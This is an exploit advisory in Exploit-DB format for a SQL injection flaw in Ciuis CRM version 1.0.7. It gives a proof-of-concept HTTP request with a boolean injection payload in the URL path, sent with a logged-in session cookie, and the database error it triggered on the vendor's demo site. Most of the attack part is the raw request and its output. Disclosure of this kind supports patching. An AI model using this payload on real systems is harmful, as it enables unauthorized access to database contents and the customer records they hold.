# Exploit Title: [Ciuis CRM v 1.0.7 Sql Injection]
# Google Dork: [if applicable]
# Date: [12/15/2017]
# Exploit Author: [Zahid Abbasi]
# Contact: http://twitter.com/zahidsec
# Website: http://zahidabbasi.com
# Vendor Homepage: [http://ciuis.com/]
# Software Link: [https://codecanyon.net/item/ciuis-crm/20473489]
# Version: [1.0.7] (REQUIRED)
# Tested on: [Win 7 64-bit]
# CVE : [if applicable]

1. Description

The injection required user registration on CIUS CRM. Old versions have
not been tested but it's a guess, they are also vulnerable.
The URL path filename appears to be vulnerable to SQL injection attacks.
The payload 65079277 or 7647=07647 was submitted in the URL path
filename, and a database error message was returned.
You should review the contents of the error message, and the
application's handling of other input, to confirm whether a
vulnerability is present.

2. Proof of Concept

The live testing was done on demo site of the script.
https://ciuis.com/demo/accounts/account/4 [URL path filename]
Request:-
GET /demo/accounts/account/465079277%20or%207647%3d07647 HTTP/1.1
Host: ciuis.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0)
Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: ci_session=98b5ef21cb2d123fb376f135218129226808fbec
Connection: close
Upgrade-Insecure-Requests: 1
Response:-
After placing our injection code and forwarding the request. The html
response is posted below.
<div id="container">
        <h1>A Database Error Occurred</h1>
        <p>Error Number: 1064</p><p>You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the
right syntax to use near 'and `transactiontype` =0)' at line
3</p><p>SELECT SUM(`amount`) AS `amount`
--
